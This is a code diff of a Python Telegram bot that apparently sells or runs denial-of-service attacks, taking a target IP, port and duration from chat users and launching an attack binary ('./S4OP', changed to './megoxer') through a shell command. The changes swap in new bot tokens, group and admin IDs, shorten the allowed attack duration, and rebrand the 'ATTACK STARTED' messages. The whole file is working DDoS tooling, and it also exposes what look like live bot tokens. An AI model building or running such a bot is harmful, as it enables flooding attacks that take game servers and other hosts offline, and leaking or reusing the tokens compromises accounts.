@@ -9,11 +9,11 @@ from PIL import Image
 import imagehash
 
 # Bot initialization
-BOT_TOKEN = "7551284734:AAEvogSRPk8ARZb5ON8yG90zrH9kvjrDSRw"  # Replace with your bot token
+BOT_TOKEN = "7828525928:AAGZIUO4QnLsD_ITKGSkfN5NlGP3UZvU1OM"  # Replace with your bot token
 bot = telebot.TeleBot(BOT_TOKEN)
-GROUP_ID = "-1002487517182" 
+GROUP_ID = "-1002298552334" 
 # Admin IDs
-admin_id = ["6769245930"]  # Replace with your Telegram user ID
+admin_id = ["7163028849","6039703925"]  # Replace with your Telegram user ID
 
 # Constants
 USER_FILE = "users.txt"
@@ -73,8 +73,8 @@ def handle_bgmi(message):
         target, port, duration = command[1], int(command[2]), int(command[3])
 
         # Validate the attack duration
-        if duration > 180:
-            bot.reply_to(message, "𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡 ⚠️ --> 𝟭𝟴𝟬")
+        if duration > 60:
+            bot.reply_to(message, "𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡 ⚠️ --> 𝟲𝟬")
             return
 
         # Perform the attack (same as previous code)
@@ -91,11 +91,11 @@ def handle_bgmi(message):
         markup.add(countdown_button)
 
         # Send the attack start message
-        start_message = bot.reply_to(message, f"🩷 𝗔𝗧𝗧𝗔𝗖𝗞 𝟮 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 🩷\n\n☀️𝚃𝙰𝚁𝙶𝙴𝚃 - {target} \n☀️𝙿𝙾𝚁𝚃 {port} \n☀️𝚂𝙴𝙲𝙾𝙽𝙳𝚂 {duration}\n\n𝙰𝚃𝚃𝙰𝙲𝙺 𝙱𝚈 𝚂𝟺 𝙻𝚄𝙲𝙷𝙸", reply_markup=markup)
+        start_message = bot.reply_to(message, f"🩷 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 🩷\n\n☀️𝚃𝙰𝚁𝙶𝙴𝚃 - {target} \n☀️𝙿𝙾𝚁𝚃 {port} \n☀️𝚂𝙴𝙲𝙾𝙽𝙳𝚂 {duration}\n\n𝙰𝚃𝚃𝙰𝙲𝙺 𝙱𝚈 𝚃𝙸𝚃𝙰𝙽", reply_markup=markup)
 
         # Run the attack in a separate thread
         def execute_attack(user_id, target, port, duration):
-            process = subprocess.Popen(f"./S4OP {target} {port} {duration} 1000", shell=True)
+            process = subprocess.Popen(f"./megoxer {target} {port} {duration} ", shell=True)
             active_attacks[user_id] = process
 
             # Start the attack and update the countdown every second
@@ -118,7 +118,7 @@ def handle_bgmi(message):
             active_attacks.pop(user_id, None)  # Remove the process from active attacks
 
             # Notify the user that the attack is finished
-            bot.reply_to(message, f"🩵 𝘼𝙏𝙏𝙀𝘿 𝙁𝙄𝙉𝙄𝙎𝙃𝙀𝘿 🩵 \n\n🟡𝚃𝙰𝚁𝙶𝙴𝚃 - {target} \n🟡𝙿𝙾𝚁𝚃 {port} \n🟡𝚂𝙴𝙲𝙾𝙽𝙳𝚂 {duration}\n\n𝙰𝚝𝚝𝚊𝑐𝚔 𝙵𝚒𝚗𝚒𝚜𝚑𝚎𝚍 𝙱𝚢 𝚂𝟺")
+            bot.reply_to(message, f"🩵 𝘼𝙏𝙏𝙀𝘿 𝙁𝙄𝙉𝙄𝙎𝙃𝙀𝘿 🩵 \n\n🟡𝚃𝙰𝚁𝙶𝙴𝚃 - {target} \n🟡𝙿𝙾𝚁𝚃 {port} \n🟡𝚂𝙴𝙲𝙾𝙽𝙳𝚂 {duration}\n\n𝙰𝚝𝚝𝚊𝑐𝚔 𝙵𝚒𝚗𝚒𝚜𝚑𝚎𝚍 𝙱𝚢 𝚃𝙸𝚃𝙰𝙽")
 
         # Start the attack in a separate thread
         Thread(target=execute_attack, args=(user_id, target, port, duration)).start()
